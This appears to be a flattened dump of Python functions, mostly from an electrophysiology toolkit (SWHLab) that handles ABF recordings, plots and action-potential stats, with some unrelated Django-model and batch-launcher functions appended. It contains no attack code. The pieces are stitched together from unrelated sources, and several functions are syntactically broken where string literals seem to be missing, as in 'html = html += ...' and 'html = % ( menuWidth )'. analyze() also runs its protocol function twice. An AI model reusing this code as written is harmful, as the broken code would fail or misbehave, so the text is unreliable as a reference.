def matrixToDicts ( data ) : # 1D array if "float" in str ( type ( data [ 0 ] ) ) : d = { } for x in range ( len ( data ) ) : d [ data . dtype . names [ x ] ] = data [ x ] return d # 2D array l = [ ] for y in range ( len ( data ) ) : d = { } for x in range ( len ( data [ y ] ) ) : d [ data . dtype . names [ x ] ] = data [ y ] [ x ] l . append ( d ) return l
def html_temp_launch ( html ) : fname = tempfile . gettempdir ( ) + "/swhlab/temp.html" with open ( fname , 'w' ) as f : f . write ( html ) webbrowser . open ( fname )
def checkOut ( thing , html = True ) : msg = "" for name in sorted ( dir ( thing ) ) : if not "__" in name : msg += "<b>%s</b>\n" % name try : msg += " ^-VALUE: %s\n" % getattr ( thing , name ) ( ) except : pass if html : html = '<html><body><code>' + msg + '</code></body></html>' html = html . replace ( " " , "&nbsp;" ) . replace ( "\n" , "<br>" ) fname = tempfile . gettempdir ( ) + "/swhlab/checkout.html" with open ( fname , 'w' ) as f : f . write ( html ) webbrowser . open ( fname ) print ( msg . replace ( '<b>' , '' ) . replace ( '</b>' , '' ) )
def matrixToHTML ( data , names = None , units = None , bookName = None , sheetName = None , xCol = None ) : if not names : names = [ "" ] * len ( data [ 0 ] ) if data . dtype . names : names = list ( data . dtype . names ) if not units : units = [ "" ] * len ( data [ 0 ] ) for i in range ( len ( units ) ) : if names [ i ] in UNITS . keys ( ) : units [ i ] = UNITS [ names [ i ] ] if 'recarray' in str ( type ( data ) ) : #make it a regular array data = data . view ( float ) . reshape ( data . shape + ( - 1 , ) ) if xCol and xCol in names : xCol = names . index ( xCol ) names . insert ( 0 , names [ xCol ] ) units . insert ( 0 , units [ xCol ] ) data = np . insert ( data , 0 , data [ : , xCol ] , 1 ) htmlFname = tempfile . gettempdir ( ) + "/swhlab/WKS-%s.%s.html" % ( bookName , sheetName ) html = html += "<h1>FauxRigin</h1>" if bookName or sheetName : html += '<code><b>%s / %s</b></code><br><br>' % ( bookName , sheetName ) html += "<table>" #cols=list(range(len(names))) colNames = [ '' ] for i in range ( len ( units ) ) : label = "%s (%d)" % ( chr ( i + ord ( 'A' ) ) , i ) colNames . append ( label ) html += htmlListToTR ( colNames , 'labelCol' , 'labelCol' ) html += htmlListToTR ( [ 'Long Name' ] + list ( names ) , 'name' , td1Class = 'labelRow' ) html += htmlListToTR ( [ 'Units' ] + list ( units ) , 'units' , td1Class = 'labelRow' ) cutOff = False for y in range ( len ( data ) ) : html += htmlListToTR ( [ y + 1 ] + list ( data [ y ] ) , trClass = 'data%d' % ( y % 2 ) , td1Class = 'labelRow' ) if y >= 200 : cutOff = True break html += "</table>" html = html . replace ( ">nan<" , ">--<" ) html = html . replace ( ">None<" , "><" ) if cutOff : html += "<h3>... showing only %d of %d rows ...</h3>" % ( y , len ( data ) ) html += "</body></html>" with open ( htmlFname , 'w' ) as f : f . write ( html ) webbrowser . open ( htmlFname ) return
def XMLtoPython ( xmlStr = r"C:\Apps\pythonModules\GSTemp.xml" ) : #TODO: this absolute file path crazy stuff needs to stop! if os . path . exists ( xmlStr ) : with open ( xmlStr ) as f : xmlStr = f . read ( ) print ( xmlStr ) print ( "DONE" ) return
def algo_exp ( x , m , t , b ) : return m * np . exp ( - t * x ) + b
def filter_gaussian ( Ys , sigma , plotToo = False ) : timeA = time . time ( ) window = scipy . signal . gaussian ( len ( Ys ) , sigma ) window /= sum ( window ) Ys2 = np . convolve ( Ys , window , 'same' ) print ( "LEN:" , len ( Ys2 ) , len ( Ys ) ) timeB = time . time ( ) print ( "convolution took %.03f ms" % ( ( timeB - timeA ) * 1000 ) ) if len ( Ys2 ) != len ( Ys ) : print ( "?!?!?!? convolution point size mismatch" ) if plotToo : pylab . plot ( Ys , label = 'original' , alpha = .2 ) pylab . plot ( Ys2 , 'b-' , label = 'smooth' ) pylab . legend ( ) pylab . show ( ) return Ys2
def where_cross ( data , threshold ) : Is = np . where ( data > threshold ) [ 0 ] Is = np . concatenate ( ( [ 0 ] , Is ) ) Ds = Is [ : - 1 ] - Is [ 1 : ] + 1 return Is [ np . where ( Ds ) [ 0 ] + 1 ]
def originFormat ( thing ) : if type ( thing ) is list and type ( thing [ 0 ] ) is dict : return originFormat_listOfDicts ( thing ) if type ( thing ) is list and type ( thing [ 0 ] ) is list : return originFormat_listOfDicts ( dictFlat ( thing ) ) else : print ( " !! I don't know how to format this object!" ) print ( thing )
def pickle_save ( thing , fname ) : pickle . dump ( thing , open ( fname , "wb" ) , pickle . HIGHEST_PROTOCOL ) return thing
def msgDict ( d , matching = None , sep1 = "=" , sep2 = "\n" , sort = True , cantEndWith = None ) : msg = "" if "record" in str ( type ( d ) ) : keys = d . dtype . names else : keys = d . keys ( ) if sort : keys = sorted ( keys ) for key in keys : if key [ 0 ] == "_" : continue if matching : if not key in matching : continue if cantEndWith and key [ - len ( cantEndWith ) ] == cantEndWith : continue if 'float' in str ( type ( d [ key ] ) ) : s = "%.02f" % d [ key ] else : s = str ( d [ key ] ) if "object" in s : s = '<object>' msg += key + sep1 + s + sep2 return msg . strip ( )
def findRelevantData ( fileList , abfs ) : relevant = [ ] things = { } for abf in abfs : for fname in fileList : if abf in fname and not fname in relevant : relevant . append ( fname ) for item in sorted ( relevant ) : thing = os . path . basename ( item ) if ".png" in thing : continue if not "_" in thing : continue thing = thing . split ( "_" ) [ - 1 ] . split ( "." ) [ 0 ] if not thing in things . keys ( ) : #prevent overwriting things [ thing ] = item return things
def determineProtocol ( fname ) : f = open ( fname , 'rb' ) raw = f . read ( 5000 ) #it should be in the first 5k of the file f . close ( ) protoComment = "unknown" if b"SWHLab4[" in raw : protoComment = raw . split ( b"SWHLab4[" ) [ 1 ] . split ( b"]" , 1 ) [ 0 ] elif b"SWH[" in raw : protoComment = raw . split ( b"SWH[" ) [ 1 ] . split ( b"]" , 1 ) [ 0 ] else : protoComment = "?" if not type ( protoComment ) is str : protoComment = protoComment . decode ( "utf-8" ) return protoComment
def getParent ( abfFname ) : child = os . path . abspath ( abfFname ) files = sorted ( glob . glob ( os . path . dirname ( child ) + "/*.*" ) ) parentID = abfFname #its own parent for fname in files : if fname . endswith ( ".abf" ) and fname . replace ( ".abf" , ".TIF" ) in files : parentID = os . path . basename ( fname ) . replace ( ".abf" , "" ) if os . path . basename ( child ) in fname : break return parentID
def getParent2 ( abfFname , groups ) : if ".abf" in abfFname : abfFname = os . path . basename ( abfFname ) . replace ( ".abf" , "" ) for parentID in groups . keys ( ) : if abfFname in groups [ parentID ] : return parentID return abfFname
def getNotesForABF ( abfFile ) : parent = getParent ( abfFile ) parent = os . path . basename ( parent ) . replace ( ".abf" , "" ) expFile = os . path . dirname ( abfFile ) + "/experiment.txt" if not os . path . exists ( expFile ) : return "no experiment file" with open ( expFile ) as f : raw = f . readlines ( ) for line in raw : if line [ 0 ] == '~' : line = line [ 1 : ] . strip ( ) if line . startswith ( parent ) : while "\t\t" in line : line = line . replace ( "\t\t" , "\t" ) line = line . replace ( "\t" , "\n" ) return line return "experiment.txt found, but didn't contain %s" % parent
def getIDsFromFiles ( files ) : if type ( files ) is str : files = glob . glob ( files + "/*.*" ) IDs = [ ] for fname in files : if fname [ - 4 : ] . lower ( ) == '.abf' : ext = fname . split ( '.' ) [ - 1 ] IDs . append ( os . path . basename ( fname ) . replace ( '.' + ext , '' ) ) return sorted ( IDs )
def inspectABF ( abf = exampleABF , saveToo = False , justPlot = False ) : pylab . close ( 'all' ) print ( " ~~ inspectABF()" ) if type ( abf ) is str : abf = swhlab . ABF ( abf ) swhlab . plot . new ( abf , forceNewFigure = True ) if abf . sweepInterval * abf . sweeps < 60 * 5 : #shorter than 5 minutes pylab . subplot ( 211 ) pylab . title ( "%s [%s]" % ( abf . ID , abf . protoComment ) ) swhlab . plot . sweep ( abf , 'all' ) pylab . subplot ( 212 ) swhlab . plot . sweep ( abf , 'all' , continuous = True ) swhlab . plot . comments ( abf ) else : print ( " -- plotting as long recording" ) swhlab . plot . sweep ( abf , 'all' , continuous = True , minutes = True ) swhlab . plot . comments ( abf , minutes = True ) pylab . title ( "%s [%s]" % ( abf . ID , abf . protoComment ) ) swhlab . plot . annotate ( abf ) if justPlot : return if saveToo : path = os . path . split ( abf . fname ) [ 0 ] basename = os . path . basename ( abf . fname ) pylab . savefig ( os . path . join ( path , "_" + basename . replace ( ".abf" , ".png" ) ) ) pylab . show ( ) return
def ftp_login ( folder = None ) : pwDir = os . path . realpath ( __file__ ) for i in range ( 3 ) : pwDir = os . path . dirname ( pwDir ) pwFile = os . path . join ( pwDir , "passwd.txt" ) print ( " -- looking for login information in:\n   [%s]" % pwFile ) try : with open ( pwFile ) as f : lines = f . readlines ( ) username = lines [ 0 ] . strip ( ) password = lines [ 1 ] . strip ( ) print ( " -- found a valid username/password" ) except : print ( " -- password lookup FAILED." ) username = TK_askPassword ( "FTP LOGIN" , "enter FTP username" ) password = TK_askPassword ( "FTP LOGIN" , "enter password for %s" % username ) if not username or not password : print ( " !! failed getting login info. aborting FTP effort." ) return print ( "      username:" , username ) print ( "      password:" , "*" * ( len ( password ) ) ) print ( " -- logging in to FTP ..." ) try : ftp = ftplib . FTP ( "swharden.com" ) ftp . login ( username , password ) if folder : ftp . cwd ( folder ) return ftp except : print ( " !! login failure !!" ) return False
def ftp_folder_match ( ftp , localFolder , deleteStuff = True ) : for fname in glob . glob ( localFolder + "/*.*" ) : ftp_upload ( ftp , fname ) return
def version_upload ( fname , username = "nibjb" ) : print ( "popping up pasword window..." ) password = TK_askPassword ( "FTP LOGIN" , "enter password for %s" % username ) if not password : return print ( "username:" , username ) print ( "password:" , "*" * ( len ( password ) ) ) print ( "connecting..." ) ftp = ftplib . FTP ( "swharden.com" ) ftp . login ( username , password ) print ( "successful login!" ) ftp . cwd ( "/software/swhlab/versions" ) #IMMEDIATELY GO HERE!!! print ( "uploading" , os . path . basename ( fname ) ) ftp . storbinary ( "STOR " + os . path . basename ( fname ) , open ( fname , "rb" ) , 1024 ) #for binary files print ( "disconnecting..." ) ftp . quit ( )
def TK_askPassword ( title = "input" , msg = "type here:" ) : root = tkinter . Tk ( ) root . withdraw ( ) #hide tk window root . attributes ( "-topmost" , True ) #always on top root . lift ( ) #bring to top value = tkinter . simpledialog . askstring ( title , msg ) root . destroy ( ) return value
def TK_message ( title , msg ) : root = tkinter . Tk ( ) root . withdraw ( ) #hide tk window root . attributes ( "-topmost" , True ) #always on top root . lift ( ) #bring to top tkinter . messagebox . showwarning ( title , msg ) root . destroy ( )
def TK_ask ( title , msg ) : root = tkinter . Tk ( ) root . attributes ( "-topmost" , True ) #always on top root . withdraw ( ) #hide tk window result = tkinter . messagebox . askyesno ( title , msg ) root . destroy ( ) return result
def processArgs ( ) : if len ( sys . argv ) < 2 : print ( "\n\nERROR:" ) print ( "this script requires arguments!" ) print ( 'try "python command.py info"' ) return if sys . argv [ 1 ] == 'info' : print ( "import paths:\n " , "\n  " . join ( sys . path ) ) print ( ) print ( "python version:" , sys . version ) print ( "SWHLab path:" , __file__ ) print ( "SWHLab version:" , swhlab . __version__ ) return if sys . argv [ 1 ] == 'glanceFolder' : abfFolder = swhlab . common . gui_getFolder ( ) if not abfFolder or not os . path . isdir ( abfFolder ) : print ( "bad path" ) return fnames = sorted ( glob . glob ( abfFolder + "/*.abf" ) ) outFolder = tempfile . gettempdir ( ) + "/swhlab/" if os . path . exists ( outFolder ) : shutil . rmtree ( outFolder ) os . mkdir ( outFolder ) outFile = outFolder + "/index.html" out = '<html><body>' out += '<h2>%s</h2>' % abfFolder for i , fname in enumerate ( fnames ) : print ( "\n\n### PROCESSING %d of %d" % ( i , len ( fnames ) ) ) saveAs = os . path . join ( os . path . dirname ( outFolder ) , os . path . basename ( fname ) ) + ".png" out += '<br><br><br><code>%s</code><br>' % os . path . abspath ( fname ) out += '<a href="%s"><img src="%s"></a><br>' % ( saveAs , saveAs ) swhlab . analysis . glance . processAbf ( fname , saveAs ) out += '</body></html>' with open ( outFile , 'w' ) as f : f . write ( out ) webbrowser . open_new_tab ( outFile ) return print ( "\n\nERROR:\nI'm not sure how to process these arguments!" ) print ( sys . argv )
def check_sweep ( abf , sweep = None , dT = .1 ) : if abf . APs is None : APs = [ ] else : APs = cm . matrixToDicts ( abf . APs ) if sweep is None or len ( sweep ) == 0 : #find the first sweep with >5APs in it for sweepNum in range ( abf . sweeps ) : foundInThisSweep = 0 for AP in APs : if AP [ "sweep" ] == sweepNum : foundInThisSweep += 1 if foundInThisSweep >= 5 : break sweep = sweepNum abf . setSweep ( sweep ) Y = abf . dataY dI = int ( dT / 1000 * abf . rate ) #dI is dT/rate dY = ( Y [ dI : ] - Y [ : - dI ] ) * ( abf . rate / 1000 / dI ) #now in V/S pylab . figure ( figsize = ( 12 , 6 ) ) ax = pylab . subplot ( 211 ) pylab . title ( "sweep %d" % abf . currentSweep ) pylab . ylabel ( "membrane potential (mV)" ) pylab . plot ( Y , '-' , alpha = .8 ) for AP in APs : if not AP [ "sweep" ] == sweep : continue pylab . axvline ( AP [ "sweepI" ] , alpha = .2 , color = 'r' ) pylab . plot ( AP [ "peakI" ] , AP [ "peak" ] , '.' , alpha = .5 , ms = 20 , color = 'r' ) pylab . plot ( AP [ "thresholdI" ] , AP [ "threshold" ] , '.' , alpha = .5 , ms = 20 , color = 'c' ) pylab . plot ( [ AP [ "AHPI" ] , AP [ "AHPreturnI" ] ] , [ AP [ "AHP" ] , AP [ "AHPreturn" ] ] , '-' , alpha = .2 , ms = 20 , color = 'b' , lw = 7 ) pylab . plot ( [ AP [ "halfwidthI1" ] , AP [ "halfwidthI2" ] ] , [ AP [ "halfwidthPoint" ] , AP [ "halfwidthPoint" ] ] , '-' , lw = 5 , alpha = .5 , color = 'g' ) pylab . subplot ( 212 , sharex = ax ) pylab . ylabel ( "velocity (V/S)" ) pylab . xlabel ( "data points (%.02f kHz)" % ( abf . rate / 1000 ) ) pylab . plot ( dY , '-' , alpha = .8 ) pylab . margins ( 0 , .1 ) for AP in APs : if not AP [ "sweep" ] == sweep : continue pylab . axvline ( AP [ "sweepI" ] , alpha = .2 , color = 'r' ) pylab . plot ( AP [ "upslopeI" ] , AP [ "upslope" ] , '.' , alpha = .5 , ms = 20 , color = 'g' ) pylab . plot ( AP [ "downslopeI" ] , AP [ "downslope" ] , '.' , alpha = .5 , ms = 20 , color = 'g' ) pylab . axis ( [ APs [ 0 ] [ "sweepI" ] - 1000 , APs [ - 1 ] [ "sweepI" ] + 1000 , None , None ] )
def stats_first ( abf ) : msg = "" for sweep in range ( abf . sweeps ) : for AP in abf . APs [ sweep ] : for key in sorted ( AP . keys ( ) ) : if key [ - 1 ] is "I" or key [ - 2 : ] in [ "I1" , "I2" ] : continue msg += "%s = %s\n" % ( key , AP [ key ] ) return msg
def getAvgBySweep ( abf , feature , T0 = None , T1 = None ) : if T1 is None : T1 = abf . sweepLength if T0 is None : T0 = 0 data = [ np . empty ( ( 0 ) ) ] * abf . sweeps for AP in cm . dictFlat ( cm . matrixToDicts ( abf . APs ) ) : if T0 < AP [ 'sweepT' ] < T1 : val = AP [ feature ] data [ int ( AP [ 'sweep' ] ) ] = np . concatenate ( ( data [ int ( AP [ 'sweep' ] ) ] , [ val ] ) ) for sweep in range ( abf . sweeps ) : if len ( data [ sweep ] ) > 1 and np . any ( data [ sweep ] ) : data [ sweep ] = np . nanmean ( data [ sweep ] ) elif len ( data [ sweep ] ) == 1 : data [ sweep ] = data [ sweep ] [ 0 ] else : data [ sweep ] = np . nan return data
def gain ( abf ) : Ys = np . nan_to_num ( swhlab . ap . getAvgBySweep ( abf , 'freq' ) ) Xs = abf . clampValues ( abf . dataX [ int ( abf . protoSeqX [ 1 ] + .01 ) ] ) swhlab . plot . new ( abf , title = "gain function" , xlabel = "command current (pA)" , ylabel = "average inst. freq. (Hz)" ) pylab . plot ( Xs , Ys , '.-' , ms = 20 , alpha = .5 , color = 'b' ) pylab . axhline ( 0 , alpha = .5 , lw = 2 , color = 'r' , ls = "--" ) pylab . margins ( .1 , .1 )
def comments ( abf , minutes = False ) : if not len ( abf . commentTimes ) : return for i in range ( len ( abf . commentTimes ) ) : t , c = abf . commentTimes [ i ] , abf . commentTags [ i ] if minutes : t = t / 60 pylab . axvline ( t , lw = 1 , color = 'r' , ls = "--" , alpha = .5 ) X1 , X2 , Y1 , Y2 = pylab . axis ( ) Y2 = Y2 - abs ( Y2 - Y1 ) * .02 pylab . text ( t , Y2 , c , size = 8 , color = 'r' , rotation = 'vertical' , ha = 'right' , va = 'top' , weight = 'bold' , alpha = .5 ) if minutes : pylab . xlabel ( "minutes" ) else : pylab . xlabel ( "seconds" )
def annotate ( abf ) : msg = "SWHLab %s " % str ( swhlab . VERSION ) msg += "ID:%s " % abf . ID msg += "CH:%d " % abf . channel msg += "PROTOCOL:%s " % abf . protoComment msg += "COMMAND: %d%s " % ( abf . holding , abf . units ) msg += "GENERATED:%s " % '{0:%Y-%m-%d %H:%M:%S}' . format ( datetime . datetime . now ( ) ) pylab . annotate ( msg , ( .001 , .001 ) , xycoords = 'figure fraction' , ha = 'left' , va = 'bottom' , color = '#999999' , family = 'monospace' , size = 8 , weight = 'bold' ) if abf . nADC > 1 : msg = "Ch %d/%d" % ( abf . channel + 1 , abf . nADC ) pylab . annotate ( msg , ( .01 , .99 ) , xycoords = 'figure fraction' , ha = 'left' , va = 'top' , color = '#FF0000' , family = 'monospace' , size = 12 , weight = 'bold' )
def tryLoadingFrom ( tryPath , moduleName = 'swhlab' ) : if not 'site-packages' in swhlab . __file__ : print ( "loaded custom swhlab module from" , os . path . dirname ( swhlab . __file__ ) ) return # no need to warn if it's already outside. while len ( tryPath ) > 5 : sp = tryPath + "/swhlab/" # imaginary swhlab module path if os . path . isdir ( sp ) and os . path . exists ( sp + "/__init__.py" ) : if not os . path . dirname ( tryPath ) in sys . path : sys . path . insert ( 0 , os . path . dirname ( tryPath ) ) print ( "#" * 80 ) print ( "# WARNING: using site-packages swhlab module" ) print ( "#" * 80 ) tryPath = os . path . dirname ( tryPath ) return
def show ( self ) : copied = self . copy ( ) enumerated = [ el for el in enumerate ( copied ) ] for ( group_ind , specs ) in enumerated : if len ( enumerated ) > 1 : print ( "Group %d" % group_ind ) ordering = self . constant_keys + self . varying_keys # Ordered nicely by varying_keys definition. spec_lines = [ ', ' . join ( [ '%s=%s' % ( k , s [ k ] ) for k in ordering ] ) for s in specs ] print ( '\n' . join ( [ '%d: %s' % ( i , l ) for ( i , l ) in enumerate ( spec_lines ) ] ) ) print ( 'Remaining arguments not available for %s' % self . __class__ . __name__ )
def analyze ( fname = False , save = True , show = None ) : if fname and os . path . exists ( fname . replace ( ".abf" , ".rst" ) ) : print ( "SKIPPING DUE TO RST FILE" ) return swhlab . plotting . core . IMAGE_SAVE = save if show is None : if cm . isIpython ( ) : swhlab . plotting . core . IMAGE_SHOW = True else : swhlab . plotting . core . IMAGE_SHOW = False #swhlab.plotting.core.IMAGE_SHOW=show abf = ABF ( fname ) # ensure it's a class print ( ">>>>> PROTOCOL >>>>>" , abf . protocomment ) runFunction = "proto_unknown" if "proto_" + abf . protocomment in globals ( ) : runFunction = "proto_" + abf . protocomment abf . log . debug ( "running %s()" % ( runFunction ) ) plt . close ( 'all' ) # get ready globals ( ) [ runFunction ] ( abf ) # run that function try : globals ( ) [ runFunction ] ( abf ) # run that function except : abf . log . error ( "EXCEPTION DURING PROTOCOL FUNCTION" ) abf . log . error ( sys . exc_info ( ) [ 0 ] ) return "ERROR" plt . close ( 'all' ) # clean up return "SUCCESS"
def figure ( self , forceNew = False ) : if plt . _pylab_helpers . Gcf . get_num_fig_managers ( ) > 0 and forceNew is False : self . log . debug ( "figure already seen, not creating one." ) return if self . subplot : self . log . debug ( "subplot mode enabled, not creating new figure" ) else : self . log . debug ( "creating new figure" ) plt . figure ( figsize = ( self . figure_width , self . figure_height ) )
def save ( self , callit = "misc" , closeToo = True , fullpath = False ) : if fullpath is False : fname = self . abf . outPre + "plot_" + callit + ".jpg" else : fname = callit if not os . path . exists ( os . path . dirname ( fname ) ) : os . mkdir ( os . path . dirname ( fname ) ) plt . savefig ( fname ) self . log . info ( "saved [%s]" , os . path . basename ( fname ) ) if closeToo : plt . close ( )
def figure_sweeps ( self , offsetX = 0 , offsetY = 0 ) : self . log . debug ( "creating overlayed sweeps plot" ) self . figure ( ) for sweep in range ( self . abf . sweeps ) : self . abf . setsweep ( sweep ) self . setColorBySweep ( ) plt . plot ( self . abf . sweepX2 + sweep * offsetX , self . abf . sweepY + sweep * offsetY , * * self . kwargs ) if offsetX : self . marginX = .05 self . decorate ( )
def figure_protocol ( self ) : self . log . debug ( "creating overlayed protocols plot" ) self . figure ( ) plt . plot ( self . abf . protoX , self . abf . protoY , color = 'r' ) self . marginX = 0 self . decorate ( protocol = True )
def figure_protocols ( self ) : self . log . debug ( "creating overlayed protocols plot" ) self . figure ( ) for sweep in range ( self . abf . sweeps ) : self . abf . setsweep ( sweep ) plt . plot ( self . abf . protoX , self . abf . protoY , color = 'r' ) self . marginX = 0 self . decorate ( protocol = True )
def frames ( fname = None , menuWidth = 200 , launch = False ) : html = % ( menuWidth ) with open ( fname , 'w' ) as f : f . write ( html ) if launch : webbrowser . open ( fname )
def filesByExtension ( fnames ) : byExt = { "abf" : [ ] , "jpg" : [ ] , "tif" : [ ] } # prime it with empties for fname in fnames : ext = os . path . splitext ( fname ) [ 1 ] . replace ( "." , '' ) . lower ( ) if not ext in byExt . keys ( ) : byExt [ ext ] = [ ] byExt [ ext ] = byExt [ ext ] + [ fname ] return byExt
def filesByCell ( fnames , cells ) : byCell = { } fnames = smartSort ( fnames ) days = list ( set ( [ elem [ : 5 ] for elem in fnames if elem . endswith ( ".abf" ) ] ) ) # so pythonic! for day in smartSort ( days ) : parent = None for i , fname in enumerate ( [ elem for elem in fnames if elem . startswith ( day ) and elem . endswith ( ".abf" ) ] ) : ID = os . path . splitext ( fname ) [ 0 ] if len ( [ x for x in fnames if x . startswith ( ID ) ] ) - 1 : parent = ID if not parent in byCell : byCell [ parent ] = [ ] byCell [ parent ] = byCell [ parent ] + [ fname ] return byCell
def folderScan ( self , abfFolder = None ) : if abfFolder is None and 'abfFolder' in dir ( self ) : abfFolder = self . abfFolder else : self . abfFolder = abfFolder self . abfFolder = os . path . abspath ( self . abfFolder ) self . log . info ( "scanning [%s]" , self . abfFolder ) if not os . path . exists ( self . abfFolder ) : self . log . error ( "path doesn't exist: [%s]" , abfFolder ) return self . abfFolder2 = os . path . abspath ( self . abfFolder + "/swhlab/" ) if not os . path . exists ( self . abfFolder2 ) : self . log . error ( "./swhlab/ doesn't exist. creating it..." ) os . mkdir ( self . abfFolder2 ) self . fnames = os . listdir ( self . abfFolder ) self . fnames2 = os . listdir ( self . abfFolder2 ) self . log . debug ( "./ has %d files" , len ( self . fnames ) ) self . log . debug ( "./swhlab/ has %d files" , len ( self . fnames2 ) ) self . fnamesByExt = filesByExtension ( self . fnames ) if not "abf" in self . fnamesByExt . keys ( ) : self . log . error ( "no ABF files found" ) self . log . debug ( "found %d ABFs" , len ( self . fnamesByExt [ "abf" ] ) ) self . cells = findCells ( self . fnames ) # list of cells by their ID self . log . debug ( "found %d cells" % len ( self . cells ) ) self . fnamesByCell = filesByCell ( self . fnames , self . cells ) # only ABFs self . log . debug ( "grouped cells by number of source files: %s" % str ( [ len ( self . fnamesByCell [ elem ] ) for elem in self . fnamesByCell ] ) )
def html_index_splash ( self ) : html = % version . __version__ #html+='<code>%s</code><br><br>'%self.abfFolder #html+='<hr>' for parent in smartSort ( self . fnamesByCell . keys ( ) ) : html += '<br><b><a href="%s.html">%s</a></b><br>' % ( parent , parent ) for child in self . fnamesByCell [ parent ] : fullpath = os . path . join ( self . abfFolder , child ) protocol = swhlab . swh_abf . abfProtocol ( fullpath ) html += '<code>%s[%s]</code><br>' % ( fullpath , protocol ) style . save ( html , self . abfFolder2 + "/index_splash.html" ) return
def html_singleAll ( self , template = "basic" ) : for fname in smartSort ( self . cells ) : if template == "fixed" : self . html_single_fixed ( fname ) else : self . html_single_basic ( fname )
def proto_01_01_HP010 ( abf = exampleABF ) : swhlab . memtest . memtest ( abf ) #knows how to do IC memtest swhlab . memtest . checkSweep ( abf ) #lets you eyeball check how it did swhlab . plot . save ( abf , tag = "tau" )
def proto_01_12_steps025 ( abf = exampleABF ) : swhlab . ap . detect ( abf ) standard_groupingForInj ( abf , 200 ) for feature in [ 'freq' , 'downslope' ] : swhlab . ap . plot_values ( abf , feature , continuous = False ) #plot AP info swhlab . plot . save ( abf , tag = 'A_' + feature ) swhlab . plot . gain ( abf ) #easy way to do a gain function! swhlab . plot . save ( abf , tag = '05-gain' )
def proto_01_13_steps025dual ( abf = exampleABF ) : swhlab . ap . detect ( abf ) standard_groupingForInj ( abf , 200 ) for feature in [ 'freq' , 'downslope' ] : swhlab . ap . plot_values ( abf , feature , continuous = False ) #plot AP info swhlab . plot . save ( abf , tag = 'A_' + feature ) f1 = swhlab . ap . getAvgBySweep ( abf , 'freq' , None , 1 ) f2 = swhlab . ap . getAvgBySweep ( abf , 'freq' , 1 , None ) f1 = np . nan_to_num ( f1 ) f2 = np . nan_to_num ( f2 ) Xs = abf . clampValues ( abf . dataX [ int ( abf . protoSeqX [ 1 ] + .01 ) ] ) swhlab . plot . new ( abf , title = "gain function" , xlabel = "command current (pA)" , ylabel = "average inst. freq. (Hz)" ) pylab . plot ( Xs , f1 , '.-' , ms = 20 , alpha = .5 , label = "step 1" , color = 'b' ) pylab . plot ( Xs , f2 , '.-' , ms = 20 , alpha = .5 , label = "step 2" , color = 'r' ) pylab . legend ( loc = 'upper left' ) pylab . axis ( [ Xs [ 0 ] , Xs [ - 1 ] , None , None ] ) swhlab . plot . save ( abf , tag = 'gain' )
def proto_02_01_MT70 ( abf = exampleABF ) : standard_overlayWithAverage ( abf ) swhlab . memtest . memtest ( abf ) swhlab . memtest . checkSweep ( abf ) swhlab . plot . save ( abf , tag = 'check' , resize = False )
def proto_02_03_IVfast ( abf = exampleABF ) : av1 , sd1 = swhlab . plot . IV ( abf , .6 , .9 , True ) swhlab . plot . save ( abf , tag = 'iv1' ) Xs = abf . clampValues ( .6 ) #generate IV clamp values abf . saveThing ( [ Xs , av1 ] , 'iv' )
def proto_04_01_MTmon70s2 ( abf = exampleABF ) : standard_inspect ( abf ) swhlab . memtest . memtest ( abf ) swhlab . memtest . checkSweep ( abf ) swhlab . plot . save ( abf , tag = 'check' , resize = False ) swhlab . memtest . plot_standard4 ( abf ) swhlab . plot . save ( abf , tag = 'memtests' )
def proto_VC_50_MT_IV ( abf = exampleABF ) : swhlab . memtest . memtest ( abf ) #do membrane test on every sweep swhlab . memtest . checkSweep ( abf ) #see all MT values swhlab . plot . save ( abf , tag = '02-check' , resize = False ) av1 , sd1 = swhlab . plot . IV ( abf , 1.2 , 1.4 , True , 'b' ) swhlab . plot . save ( abf , tag = 'iv' ) Xs = abf . clampValues ( 1.2 ) #generate IV clamp values abf . saveThing ( [ Xs , av1 ] , '01_iv' )
def indexImages ( folder , fname = "index.html" ) : #TODO: REMOVE html = "<html><body>" for item in glob . glob ( folder + "/*.*" ) : if item . split ( "." ) [ - 1 ] in [ 'jpg' , 'png' ] : html += "<h3>%s</h3>" % os . path . basename ( item ) html += '<img src="%s">' % os . path . basename ( item ) html += '<br>' * 10 html += "</html></body>" f = open ( folder + "/" + fname , 'w' ) f . write ( html ) f . close print ( "indexed:" ) print ( "  " , os . path . abspath ( folder + "/" + fname ) ) return
def save ( self , * args , * * kwargs ) : current_activable_value = getattr ( self , self . ACTIVATABLE_FIELD_NAME ) is_active_changed = self . id is None or self . __original_activatable_value != current_activable_value self . __original_activatable_value = current_activable_value ret_val = super ( BaseActivatableModel , self ) . save ( * args , * * kwargs ) # Emit the signals for when the is_active flag is changed if is_active_changed : model_activations_changed . send ( self . __class__ , instance_ids = [ self . id ] , is_active = current_activable_value ) if self . activatable_field_updated : model_activations_updated . send ( self . __class__ , instance_ids = [ self . id ] , is_active = current_activable_value ) return ret_val
def delete ( self , force = False , * * kwargs ) : if force : return super ( BaseActivatableModel , self ) . delete ( * * kwargs ) else : setattr ( self , self . ACTIVATABLE_FIELD_NAME , False ) return self . save ( update_fields = [ self . ACTIVATABLE_FIELD_NAME ] )
def show ( self , args , file_handle = None , * * kwargs ) : full_string = '' info = { 'root_directory' : '<root_directory>' , 'batch_name' : '<batch_name>' , 'batch_tag' : '<batch_tag>' , 'batch_description' : '<batch_description>' , 'launcher' : '<launcher>' , 'timestamp_format' : '<timestamp_format>' , 'timestamp' : tuple ( time . localtime ( ) ) , 'varying_keys' : args . varying_keys , 'constant_keys' : args . constant_keys , 'constant_items' : args . constant_items } quoted_cmds = [ subprocess . list2cmdline ( [ el for el in self ( self . _formatter ( s ) , '<tid>' , info ) ] ) for s in args . specs ] cmd_lines = [ '%d: %s\n' % ( i , qcmds ) for ( i , qcmds ) in enumerate ( quoted_cmds ) ] full_string += '' . join ( cmd_lines ) if file_handle : file_handle . write ( full_string ) file_handle . flush ( ) else : print ( full_string )
def cross_check_launchers ( self , launchers ) : if len ( launchers ) == 0 : raise Exception ( 'Empty launcher list' ) timestamps = [ launcher . timestamp for launcher in launchers ] if not all ( timestamps [ 0 ] == tstamp for tstamp in timestamps ) : raise Exception ( "Launcher timestamps not all equal. " "Consider setting timestamp explicitly." ) root_directories = [ ] for launcher in launchers : command = launcher . command args = launcher . args command . verify ( args ) root_directory = launcher . get_root_directory ( ) if os . path . isdir ( root_directory ) : raise Exception ( "Root directory already exists: %r" % root_directory ) if root_directory in root_directories : raise Exception ( "Each launcher requires a unique root directory" ) root_directories . append ( root_directory )
